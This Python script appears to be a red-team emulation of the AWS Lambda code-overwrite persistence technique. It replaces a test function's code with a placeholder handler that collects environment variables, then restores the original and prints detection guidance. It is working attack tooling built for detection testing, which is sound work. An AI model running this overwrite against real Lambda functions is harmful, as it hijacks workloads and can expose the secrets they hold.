"""
Technique : aws.persistence.lambda-overwrite-code
Tactic    : Persistence (T1525)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.persistence.lambda-overwrite-code/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the target Lambda function.

How the attack works:
  An attacker with lambda:GetFunction + lambda:UpdateFunctionCode downloads the
  original function code, replaces it with a malicious payload, and uploads the
  new ZIP.  The function's CloudWatch Logs and external behaviour change, but
  resource-based policies and triggers remain intact — making it a subtle form
  of code hijacking.

Detection signal:
  - lambda:UpdateFunctionCode from an unexpected principal or at unusual time.
  - Checksum of function code changes (compare SHA256 before/after).
  - CloudWatch Logs showing unexpected output or errors.

Revert:
  - Automated: restore the original code ZIP downloaded at attack start.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import io
import json
import os
import subprocess
import time
import urllib.request
import zipfile
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Constants ─────────────────────────────────────────────────────────────────

DWELL_TIME_S = 2

MALICIOUS_CODE = """\
import json, os, urllib.request

def handler(event, context):
    # Malicious handler — in a real attack this would exfiltrate data
    # or establish C2 communication
    env_dump = {k: v for k, v in os.environ.items()}
    return {"statusCode": 200, "body": json.dumps({"pwned": True})}
"""


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


def make_zip_from_code(code: str) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("index.py", code)
    return buf.getvalue()


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir     = str(Path(__file__).parent.parent / "infra")
    infra         = get_pulumi_outputs(stack_dir)
    function_name = infra.get("function_name", "stratus-red-team-overwrite-lambda")

    session       = boto3.Session()
    lambda_client = session.client("lambda")

    original_zip: bytes | None = None
    code_overwritten = False

    try:
        # ── Step 1: Download original code ────────────────────────────────────
        banner("Step 1 — Download original function code (GetFunction)")
        fn_info = lambda_client.get_function(FunctionName=function_name)
        code_url = fn_info["Code"]["Location"]
        with urllib.request.urlopen(code_url) as resp:  # noqa: S310
            original_zip = resp.read()
        zip_size = len(original_zip) if original_zip else 0
        print(f"  [+] Original code downloaded ({zip_size} bytes)")
        print(f"  [!] CloudTrail event: lambda:GetFunction")

        # ── Step 2: Overwrite with malicious code ─────────────────────────────
        banner("Step 2 — Overwrite function code (UpdateFunctionCode)")
        malicious_zip = make_zip_from_code(MALICIOUS_CODE)
        lambda_client.update_function_code(
            FunctionName=function_name,
            ZipFile=malicious_zip,
        )
        code_overwritten = True
        print(f"  [+] Function code replaced with malicious payload: {function_name}")
        print(f"  [!] CloudTrail event: lambda:UpdateFunctionCode")
        print(f"  [!] Every invocation of '{function_name}' now runs attacker-controlled code.")

        time.sleep(DWELL_TIME_S)

    finally:
        # ── Revert ────────────────────────────────────────────────────────────
        banner("Revert — Restore original function code")
        if code_overwritten and original_zip:
            try:
                lambda_client.update_function_code(
                    FunctionName=function_name,
                    ZipFile=original_zip,
                )
                print(f"  [+] Original code restored for: {function_name}")
            except ClientError as exc:
                print(f"  [!] UpdateFunctionCode (restore) failed: {exc}")
        else:
            print("  [~] Nothing to restore.")

    banner("Complete")
    print("CloudTrail events: lambda:GetFunction, lambda:UpdateFunctionCode x2")
    print("\nDetection guidance:")
    print("  Alert on lambda:UpdateFunctionCode from unexpected principals.")
    print("  Track function code SHA256 in a CMDB and alert on changes.")
    print("\nRun `pulumi destroy` in ../infra/ to remove the Lambda function.")


if __name__ == "__main__":
    main()
